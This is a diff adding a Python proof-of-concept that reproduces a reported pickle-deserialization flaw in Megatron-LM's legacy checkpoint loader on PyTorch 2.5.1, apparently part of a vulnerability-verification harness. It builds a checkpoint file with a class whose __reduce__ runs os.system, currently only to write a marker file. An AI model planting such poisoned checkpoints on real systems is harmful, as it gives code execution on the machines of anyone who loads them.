@@ -1,0 +1,114 @@
+"""CVE-2026-65110 dynamic reproduction (Megatron-LM core_v0.17.0).
+
+``_load_base_checkpoint`` calls ``torch.load(checkpoint_name, map_location=
+'cpu')`` without ``weights_only=True`` for legacy checkpoints.  A checkpoint
+directory with a malicious ``model_optim_rng.pt`` is loaded through the real
+upstream function.  Run with the CPU PyTorch 2.5.1 venv: in PyTorch >=2.6 the
+default flipped to True, which changes the exposure and is recorded in notes.
+"""
+
+from __future__ import annotations
+
+import json
+import os
+import shutil
+import sys
+import types
+from pathlib import Path
+
+sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
+import poclib  # noqa: E402
+
+
+def main() -> None:
+    import torch
+
+    if not torch.__version__.startswith("2.5.1"):
+        poclib.fail(f"unexpected torch version {torch.__version__}; use the pinned 2.5.1 CPU venv")
+
+    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
+    repo = Path(
+        os.environ.get("UV_MEGATRON_SRC")
+        or (poclib.REPO_ROOT / "lab/upstream_verify/.cache/megatron-core_v0.17.0")
+    )
+    if not (repo / "megatron/training/checkpointing.py").is_file():
+        poclib.fail(
+            "Megatron-LM source tree missing; run the install command from manifest.json",
+            expected=str(repo),
+        )
+    sys.path.insert(0, str(repo))
+
+    text = poclib.MARKER_TEXT
+    marker = str(poclib.MARKER_FILE).replace("\\", "/")
+    poclib.start_marker("PRE")
+
+    root = poclib.EVIDENCE_DIR / "checkpoint"
+    if root.exists():
+        shutil.rmtree(root)
+    (root / "iter_0000001" / "mp_rank_00").mkdir(parents=True)
+    (root / "latest_checkpointed_iteration.txt").write_text("1\n", encoding="utf-8")
+
+    class Evil:
+        def __reduce__(self):
+            return (os.system, (f'echo {text} > "{marker}"',))
+
+    torch.save(
+        {"model": Evil()},
+        root / "iter_0000001" / "mp_rank_00" / "model_optim_rng.pt",
+        _use_new_zipfile_serialization=False,
+    )
+
+    import megatron.training.checkpointing as checkpointing
+
+    args = types.SimpleNamespace(
+        non_persistent_global_ckpt_dir=None,
+        non_persistent_ckpt_type=None,
+        ckpt_step=None,
+        exit_on_missing_checkpoint=False,
+        ckpt_format="torch",
+        use_dist_ckpt=False,
+        auto_detect_ckpt_format=False,
+        use_megatron_fsdp=False,
+    )
+    error = None
+    loaded = None
+    try:
+        loaded, name, release, ctype = checkpointing._load_base_checkpoint(
+            str(root), args, rank0=True
+        )
+    except SystemExit as exc:
+        error = f"SystemExit({exc.code})"
+    except Exception as exc:
+        error = f"{type(exc).__name__}: {exc}"
+
+    if not poclib.marker_ok():
+        poclib.fail("Megatron _load_base_checkpoint did not execute the pickle", error=error)
+
+    poclib.finish_verified(
+        {
+            "transport": {
+                "type": "function+torch.load",
+                "entrypoint": "megatron.training.checkpointing._load_base_checkpoint",
+                "source": poclib.rel(poclib.upstream_path(manifest["root_cause"]["source"])),
+                "source_sha256": poclib.sha256_file(poclib.upstream_path(manifest["root_cause"]["source"])),
+                "torch_version": torch.__version__,
+                "checkpoint": poclib.rel(root / "iter_0000001" / "mp_rank_00" / "model_optim_rng.pt"),
+                "loaded_type": type(loaded).__name__ if loaded is not None else None,
+                "post_load_error": error,
+                "version_pair_note": "torch 2.5.1 has weights_only=False default; torch>=2.6 blocks this pickle by default",
+            },
+            "request_response": [
+                {
+                    "input": "checkpoint dir with malicious model_optim_rng.pt",
+                    "entrypoint": "_load_base_checkpoint(rank0=True)",
+                    "result": "torch.load unpickled __reduce__ before checkpoint validation",
+                }
+            ],
+            "state_before": "marker=PRE",
+            "state_after": "marker contains proof text",
+        }
+    )
+
+
+if __name__ == "__main__":
+    main()
